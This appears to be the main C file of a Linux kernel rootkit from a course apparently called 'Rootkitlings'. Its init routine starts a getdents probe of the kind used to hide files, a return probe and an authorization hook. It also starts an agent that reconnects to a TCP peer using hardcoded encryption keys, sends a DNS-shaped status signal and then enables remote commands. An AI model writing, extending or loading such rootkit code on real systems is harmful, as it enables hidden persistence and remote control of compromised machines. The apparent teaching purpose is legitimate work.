// SPDX-License-Identifier: GPL-2.0
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/module.h>

#include "agent.h"
#include "agent_status.h"
#include "platform.h"
#include "rootkit.h"
#include "status_signal.h"
#include "transaction.h"

#if ROOTKITLINGS_FAIL_POINT < 0 || ROOTKITLINGS_FAIL_POINT > 14
#error "unknown ROOTKITLINGS_FAIL_POINT"
#endif

static unsigned short peer_port;
module_param(peer_port, ushort, 0400);
MODULE_PARM_DESC(peer_port, "loopback TCP listener port");

static unsigned int retry_base_ms = 25;
module_param(retry_base_ms, uint, 0400);
MODULE_PARM_DESC(retry_base_ms, "initial reconnect delay in milliseconds");

static unsigned int retry_max_ms = 200;
module_param(retry_max_ms, uint, 0400);
MODULE_PARM_DESC(retry_max_ms, "maximum reconnect delay in milliseconds");

static unsigned long session_id;
module_param(session_id, ulong, 0400);
MODULE_PARM_DESC(session_id, "unique control session identifier");

static unsigned short signal_id = 0x1234;
module_param(signal_id, ushort, 0400);
MODULE_PARM_DESC(signal_id, "DNS-shaped signal transaction identifier");

static const u8 control_key[RK_AEAD_KEY_LENGTH] = {
	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
	0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
	0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
	0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
};

static const u8 signal_key[RK_AUTH_KEY_LENGTH] = {
	0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7,
	0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf,
	0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7,
	0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf,
};

static struct rk_state *state;
static struct rk_agent agent;
static struct rk_transaction transaction;

static int __init rk_init(void)
{
	int error;

	if (!peer_port || !session_id || !retry_base_ms ||
	    retry_base_ms > retry_max_ms ||
	    retry_max_ms > 5000)
		return -EINVAL;
	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_PREFLIGHT)
		return -ECANCELED;

	state = rk_state_create();
	if (IS_ERR(state)) {
		error = PTR_ERR(state);
		state = NULL;
		return error;
	}

	rk_events_reset();
	error = rk_worker_start(state);
	if (error)
		goto destroy_state;
	error = rk_authorization_start();
	if (error)
		goto stop_worker;
	error = rk_return_probe_start(state);
	if (error)
		goto stop_authorization;
	error = rk_getdents_probe_start(state);
	if (error)
		goto stop_return_probe;
	error = rk_platform_prepare();
	if (error)
		goto stop_getdents_probe;
	error = rk_transaction_apply(&transaction);
	if (error)
		goto finish_platform;
	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_AGENT_WORKER)
		error = -EINTR;
	else
		error = rk_agent_start(&agent, peer_port, retry_base_ms,
				       retry_max_ms, control_key,
				       sizeof(control_key), session_id, state);
	if (error)
		goto restore_transaction;
	error = rk_events_publish();
	if (error)
		goto stop_agent;
	error = rk_evidence_publish();
	if (error)
		goto unpublish_events;
	error = rk_agent_status_publish(&agent, &transaction);
	if (error)
		goto unpublish_evidence;
	error = rk_proc_publish(state);
	if (error)
		goto unpublish_agent_status;

	rk_scheduler_start(state);
	if (ROOTKITLINGS_FAIL_POINT == 14)
		error = -EIO;
	else
		error = rk_status_signal_send(signal_key, sizeof(signal_key),
					      session_id, 1, 2, signal_id);
	if (error)
		goto stop_scheduler;

	rk_agent_enable_commands(&agent);
	return 0;

stop_scheduler:
	rk_scheduler_stop();
	rk_proc_unpublish();
unpublish_agent_status:
	rk_agent_status_unpublish();
unpublish_evidence:
	rk_evidence_unpublish();
unpublish_events:
	rk_events_unpublish();
stop_agent:
	rk_agent_stop(&agent);
restore_transaction:
	(void)rk_transaction_restore(&transaction);
	rk_transaction_dispose(&transaction);
finish_platform:
	rk_platform_finish();
stop_getdents_probe:
	rk_getdents_probe_stop();
stop_return_probe:
	rk_return_probe_stop();
stop_authorization:
	rk_authorization_stop();
stop_worker:
	rk_worker_stop();
destroy_state:
	rk_state_destroy(state);
	state = NULL;
	return error;
}

static void __exit rk_exit(void)
{
	rk_scheduler_stop();
	rk_agent_stop(&agent);
	rk_proc_unpublish();
	rk_agent_status_unpublish();
	rk_evidence_unpublish();
	rk_events_unpublish();
	(void)rk_transaction_restore(&transaction);
	rk_transaction_dispose(&transaction);
	rk_platform_finish();
	rk_getdents_probe_stop();
	rk_return_probe_stop();
	rk_authorization_stop();
	rk_worker_stop();
	rk_state_destroy(state);
	state = NULL;
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rootkitlings complete course rootkit");
